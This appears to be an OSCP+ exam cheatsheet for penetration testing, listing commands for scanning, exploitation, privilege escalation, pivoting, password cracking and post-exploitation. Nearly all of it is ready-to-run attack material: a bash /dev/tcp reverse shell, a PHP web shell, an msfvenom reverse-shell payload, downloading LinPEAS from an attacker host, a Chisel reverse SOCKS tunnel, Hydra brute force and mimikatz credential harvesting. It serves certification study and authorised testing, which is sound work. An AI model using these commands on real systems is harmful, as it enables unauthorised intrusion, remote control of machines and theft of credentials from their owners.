
# 🛡️ OSCP+ Cheatsheet

## 🔎 Enumeration

### 🔹 Nmap Scans
```bash
nmap -sC -sV -oA nmap/initial <IP>
nmap -p- --min-rate=1000 -T4 <IP>
```

### 🔹 SMB
```bash
smbclient -L //<IP> -N
smbmap -H <IP>
enum4linux-ng <IP>
```

### 🔹 HTTP/Web
```bash
whatweb http://<IP>
nikto -h http://<IP>
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -t 50
```

### 🔹 FTP
```bash
ftp <IP>
nmap --script ftp-anon <IP>
```

### 🔹 SNMP
```bash
snmpwalk -v2c -c public <IP>
onesixtyone -c community.txt <IP>
```

## ⚔️ Exploitation

### 🔹 Searchsploit
```bash
searchsploit <product/version>
searchsploit -x <path_to_exploit>
```

### 🔹 Compiling Exploits
```bash
gcc exploit.c -o exploit
i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
```

### 🔹 Netcat Listener
```bash
nc -nlvp <port>
```

### 🔹 Reverse Shells

- **Bash**
  ```bash
  bash -i >& /dev/tcp/<IP>/<port> 0>&1
  ```

- **PHP**
  ```php
  <?php system($_GET['cmd']); ?>
  ```

- **Python**
  ```python
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  ```

- **MSFVenom**
  ```bash
  msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
  ```

## 🏃 Privilege Escalation

### 🔹 Linux
```bash
uname -a
sudo -l
find / -perm -u=s -type f 2>/dev/null
```

- LinPEAS:
  ```bash
  wget <your_ip>/linpeas.sh
  chmod +x linpeas.sh
  ./linpeas.sh
  ```

- GTFOBins: https://gtfobins.github.io/

### 🔹 Windows
```powershell
whoami /priv
systeminfo
```

- WinPEAS:
  ```powershell
  .\winPEASx64.exe
  ```

- PowerUp:
  ```powershell
  Import-Module .\PowerUp.ps1
  Invoke-AllChecks
  ```

## 🔁 Pivoting

```bash
ssh -D 9050 user@target
proxychains nmap -sT -Pn -n <target>
```

- Chisel (reverse socks proxy):
  ```bash
  ./chisel server -p 8000 --reverse
  ./chisel client <your_ip>:8000 R:1080:socks
  ```

## 📡 Port Forwarding & Tunneling

- SSH Local Forwarding:
  ```bash
  ssh -L <local_port>:<target_ip>:<target_port> user@intermediate_host
  ```

- SSH Remote Forwarding:
  ```bash
  ssh -R <remote_port>:localhost:<local_port> user@attacker
  ```

## 🔐 Password Attacks

- Hydra:
  ```bash
  hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-get /
  ```

- John:
  ```bash
  john --wordlist=rockyou.txt hash.txt
  ```

- Hashcat:
  ```bash
  hashcat -m <mode> -a 0 hash.txt rockyou.txt
  ```

## 🧠 Post-Exploitation

- Linux Crontab:
  ```bash
  crontab -l
  cat /etc/crontab
  ```

- Credential Harvesting (Windows):
  ```powershell
  cmdkey /list
  mimikatz.exe
  ```

- File Transfer (Linux):
  ```bash
  python3 -m http.server 80
  wget http://<your_ip>/file
  ```

## 📁 Tools Reference

| Tool            | Usage                              |
|-----------------|------------------------------------|
| **Burp Suite**  | Intercept, fuzz, decode web traffic |
| **Impacket**    | Remote execution, SMB/WinRM/RPC tools |
| **Metasploit**  | Framework for rapid exploitation     |
| **Responder**   | LLMNR/NBNS poisoning                 |
| **CrackMapExec**| SMB/LDAP/WinRM interaction           |
| **BloodHound**  | AD enumeration (with SharpHound)     |

## 💡 Tips

- Always start with `nmap -p-` to ensure full port coverage.
- Use `tmux` or `screen` to avoid losing shells.
- Clean up after exploitation.
- Take thorough notes (e.g., CherryTree or Obsidian).
- Automate repetitive tasks with `bash` or `Python`.
